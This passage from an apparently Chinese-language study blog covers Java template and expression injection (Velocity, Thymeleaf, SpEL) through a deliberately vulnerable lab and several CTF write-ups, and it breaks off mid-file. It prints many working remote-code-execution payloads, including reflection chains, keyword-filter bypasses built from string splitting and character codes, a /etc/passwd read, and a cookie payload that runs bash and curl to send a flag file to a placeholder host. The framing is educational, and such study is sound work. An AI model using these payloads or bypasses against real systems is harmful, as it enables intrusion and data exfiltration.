http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span></span><br><span class="line"><span class="comment">     * Open a calculator in MacOS.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> template exp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/velocity"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处是一个Velocity的ssti。payload是<code>#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;)</code></p><p>可以看出渲染的语句是<code>#</code>开头后接一个反射构造的命令执行payload.<code>$e</code>为字符串。因此后面就是从<code>java.lang.String</code>对象开始获取类，方法，执行命令。</p><p>这点上从某种角度与SpEL非常相似。当然后面做SpEL注入时再细讲。这里分享一个之前在SharkyCTF中遇到的Thymeleaf ssti。因为当时题目后端把各种命令执行都hook了,自己一直没能成功执行命令,虽然实际上不需要命令执行就能做,但是查资料的过程中也有了新的收获。</p><p><a href="https://ctftime.org/task/11563" target="_blank" rel="noopener">https://ctftime.org/task/11563</a></p><p>这题因为使用了Thymeleaf.加上我在使用<code>[[${7*7}]]</code>时返回了49。所以我认为是使用了<code>Thymeleaf</code>来进行渲染的。(Thymeleaf是通过两个中括号取值的)可惜题目底层hook的非常严,没能RCE。读文件的payload<br><code>[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]</code>都做不到。比赛结束后才发现要猜flag这个class的存在的,比较无语。但是从中我们也可以看出,java ssti其实就是判断出对应引擎后用接近于SpEL的思路来进行利用。否则就是利用题目环境中的class读取变量.</p><p>比赛中当时参考了这篇文章<a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/" target="_blank" rel="noopener">https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/</a><br>其实仔细想想怎么看都是SpEL的意思……所以相关技巧还是留到下一篇SpEL讲吧。</p><h3 id="SpEL"><a href="#SpEL" class="headerlink" title="SpEL"></a>SpEL</h3><p>vuln code</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SpEL Injection</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2019-01-17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpEL</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SPEL to RCE</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/spel/vul/?expression=xxx.</span></span><br><span class="line"><span class="comment">     * xxx is urlencode(exp)</span></span><br><span class="line"><span class="comment">     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/spel/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rce</span><span class="params">(String expression)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">// fix method: SimpleEvaluationContext</span></span><br><span class="line">        <span class="keyword">return</span> parser.parseExpression(expression).getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        String expression = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")"</span>;</span><br><span class="line">        String result = parser.parseExpression(expression).getValue().toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先,SpEL表达式注入漏洞 是EL(expression language)的一种。之所以叫SpEL是因为它是应用在Spring框架中的。不过只要掌握了SpEL的相关知识，想必其他的表达式注入漏洞也能收手到擒来吧。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><p>因此我认为上面一类java的ssti利用本质上还是在定界符中进行了表达式运算,所以了解表达式注入也就成为了重中之重。</p><p>首先是语法知识</p><ul><li>SpEL支持的定界符</li></ul><p><code>#{}</code></p><blockquote><p>引用其他对象:#{car}<br>引用其他对象的属性：#{car.brand}<br>调用其它方法 , 还可以链式操作：#{car.toString()}</p></blockquote><p>属性名称还可以使用<code>${xxxx}</code><br>此外还有一种使用T运算符,调用类作用域方法和常量<code>#{T(java.lang.Math)}</code>返回一个java.lang.Math对象</p><p>一般来说我们会把SpEL用在xml配置或者注解的使用中，这应该是是为了其动态性。除此之外就是直接用在代码块中进行expression.</p><p>导致SpEL注入的原因如下:</p><blockquote><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：<br>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。<br>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</p></blockquote><p>在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><p>此处javasec的SpEL命令执行理论上只要使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"curl xxx"</span>)</span><br></pre></td></tr></table></figure><p>即可。不过这里执行时总是不成功，有点迷。但是没有关系，毕竟无论比赛还是实战都不可能碰上没有waf的SpEL。这里干脆直接找其他的几个例子来试试<br>(其实懒得本地建个maven项目了，我自己爬)</p><ul><li>code-breaking javacon</li></ul><p>年初的题一直留到现在…就是为了学SpEL的这一天。</p><p>题目的源码jar下好后。老样子扔进lib里直接审计<br>结构:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/11.PNG" alt><br>在配置application.xml中有这样的黑名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  thymeleaf:</span><br><span class="line">    encoding: UTF-8</span><br><span class="line">    cache: false</span><br><span class="line">    mode: HTML</span><br><span class="line">keywords:</span><br><span class="line">  blacklist:</span><br><span class="line">    - java.+lang</span><br><span class="line">    - Runtime</span><br><span class="line">    - exec.*\(</span><br><span class="line">user:</span><br><span class="line">  username: admin</span><br><span class="line">  password: admin</span><br><span class="line">  rememberMeKey: c0dehack1nghere1</span><br></pre></td></tr></table></figure><p>显然是限制了Runtime.exec的命令执行。但是实际上这个waf真的非常友好了…</p><p>再来看主体源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> io.tricking.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.tricking.challenge.spel.SmallEvaluationContext;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.common.TemplateParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CookieValue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.HttpClientErrorException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</span><br><span class="line">    ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> KeyworkProperties keyworkProperties;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserConfig userConfig;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainController</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String rememberMeValue, HttpSession session, Model model) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            String username = <span class="keyword">this</span>.userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">            <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">                session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span> &amp;&amp; !username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">            model.addAttribute(<span class="string">"name"</span>, <span class="keyword">this</span>.getAdvanceValue(username.toString()));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(&#123;<span class="string">"/login"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(&#123;<span class="string">"/login-error"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">loginError</span><span class="params">(Model model)</span> </span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"loginError"</span>, <span class="keyword">true</span>);</span><br><span class="line">        model.addAttribute(<span class="string">"errorMsg"</span>, <span class="string">"登陆失败，用户名或者密码错误！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(&#123;<span class="string">"/login"</span>&#125;)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(@RequestParam(value = <span class="string">"username"</span>,required = <span class="keyword">true</span>)</span> String username, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"password"</span>,required = <span class="keyword">true</span>)</span> String password, @<span class="title">RequestParam</span><span class="params">(value = <span class="string">"remember-me"</span>,required = <span class="keyword">false</span>)</span> String isRemember, HttpSession session, HttpServletResponse response) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.userConfig.getUsername().contentEquals(username) &amp;&amp; <span class="keyword">this</span>.userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">            <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                Cookie c = <span class="keyword">new</span> Cookie(<span class="string">"remember-me"</span>, <span class="keyword">this</span>.userConfig.encryptRememberMe());</span><br><span class="line">                c.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">                response.addCookie(c);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login-error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExceptionHandler</span>(&#123;HttpClientErrorException<span class="class">.<span class="keyword">class</span>&#125;)</span></span><br><span class="line"><span class="class">    @<span class="title">ResponseStatus</span>(<span class="title">HttpStatus</span>.<span class="title">FORBIDDEN</span>)</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">handleForbiddenException</span>() </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"forbidden"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getAdvanceValue</span><span class="params">(String val)</span> </span>&#123;</span><br><span class="line">        String[] var2 = <span class="keyword">this</span>.keyworkProperties.getBlacklist();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            String keyword = var2[var4];</span><br><span class="line">            Matcher matcher = Pattern.compile(keyword, <span class="number">34</span>).matcher(val);</span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpClientErrorException(HttpStatus.FORBIDDEN);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">        Expression exp = <span class="keyword">this</span>.parser.parseExpression(val, parserContext);</span><br><span class="line">        SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line">        <span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>流程非常简单。getAdvanceValue是一个解密+检查黑名单+调用spel的方法。而我们在登录后程序会从rememberme的cookie处对表达式进行计算。</p><p>注意到加密方式源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">encryptRememberMe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String encryptd = Encryptor.encrypt(<span class="keyword">this</span>.rememberMeKey, <span class="string">"0123456789abcdef"</span>, <span class="keyword">this</span>.username);</span><br><span class="line">        <span class="keyword">return</span> encryptd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>rememberMeKey我们是知道的,所以就可以生成对应的cookiepayload了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"curl xxxx\"&#125;)&#125;</span><br></pre></td></tr></table></figure><p>这里使用的方法是通过字符串拼接来绕过关键字过滤的问题。并且本质上还是使用的反射作为基础payload.<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/12.PNG" alt><br>生成cookie的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">spel</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Encryptor.encrypt(<span class="string">"c0dehack1nghere1"</span>, <span class="string">"0123456789abcdef"</span>, <span class="string">"#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"curl xxxxx/`cat /fla*`\"&#125;)&#125;"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/13.PNG" alt><br>收下flag.</p><p>由于还有很多CVE也是SpEL相关，所以我们可以利用相似的思路构造payload.比如用javascript引擎跟ProcessBuilder</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射 ScriptEngineManager类。获取eval.</span></span><br><span class="line">#&#123;T(String).getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.la"+"ng.Run"+"time.getRun"+"time().ex"+"ec('calc.exe')")&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射 ProcessBuilder,进行命令执行</span></span><br><span class="line">#&#123;(T(String).getClass().forName("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]&#123;'calc.exe'&#125;)).start()&#125;</span><br></pre></td></tr></table></figure><p>然后就是之前见过的用到数组绕过的方法构造的Nuxeo rce的payload。用于byoass getclass</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc.exe')&#125;</span><br></pre></td></tr></table></figure><p>不过这个payload好像测试时就没成功过。</p><p>然后还有一种bypass引号的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">116</span>)).concat(T(java.lang.Character).toString(<span class="number">32</span>)).concat(T(java.lang.Character).toString(<span class="number">47</span>)).concat(T(java.lang.Character).toString(<span class="number">101</span>)).concat(T(java.lang.Character).toString(<span class="number">116</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)).concat(T(java.lang.Character).toString(<span class="number">47</span>)).concat(T(java.lang.Character).toString(<span class="number">112</span>)).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">115</span>)).concat(T(java.lang.Character).toString(<span class="number">115</span>)).concat(T(java.lang.Character).toString(<span class="number">119</span>)).concat(T(java.lang.Character).toString(<span class="number">100</span>))).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>即利用T运算符获取到Charactor再用toString来得到字符。</p><ul><li>De1CTF calc</li></ul><p>上面的都是命令执行payload。然而实际上如果遇到De1这道题，openrasp把底层的命令执行都hook的情况,就只能从别的思路下手了。(虽然dalao还是RCE了,太强了)<br>题目的过滤大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder</span><br><span class="line">java.lang</span><br><span class="line">getClass</span><br><span class="line">Runtime</span><br><span class="line">new</span><br><span class="line">T(</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>先是这层过滤,然后才是openrasp的保护。</p><p>这道题首先如果利用spel不区分关键字大小写的特性,可以直接忽视<code>new</code>被过滤的情况读文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New java.io.BufferedReader(New java.io.FileReader(<span class="string">"/flag"</span>)).readLine()</span><br></pre></td></tr></table></figure><p>不过师傅对于这些关键字的绕过也有其他的办法<br><a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">https://landgrey.me/blog/15/</a></p><p>比如前面的getClass(),除了用数组绕过,还可以用<code>&#39;&#39;.class.getSuperclass().class</code>获取到</p><p>除此以外，还FUZZ出了<code>T%00(</code>可以绕过<code>T(</code>的waf的手段。(这是底层源码的问题,膜)</p><p>至于dalao达成RCE的思路,我觉得也非常值得学习。因为我们想要读文件或者执行命令的话,必然是要创建一个实例的。而SpEL提供了T()用来指定一个实例,这是一种思路。除此以外就是使用java代码来实例化。除了new以外,像反序列化这种方式也是可以创建实例的。所以使用<code>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))</code>这种静态方法完全可以。<br>除此之外就是要把恶意代码写在默认的类构造器中，就不需要显示的实例化类，也能执行代码了。</p><p>如果以后遇到对应的问题一定会去仔细研究下。</p><h3 id="url-security-issues"><a href="#url-security-issues" class="headerlink" title="url security issues"></a>url security issues</h3><p>今天来就几个url的问题稍微研究下。</p><ul><li>GetRequestURI</li></ul><p>GetRequestURI.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> 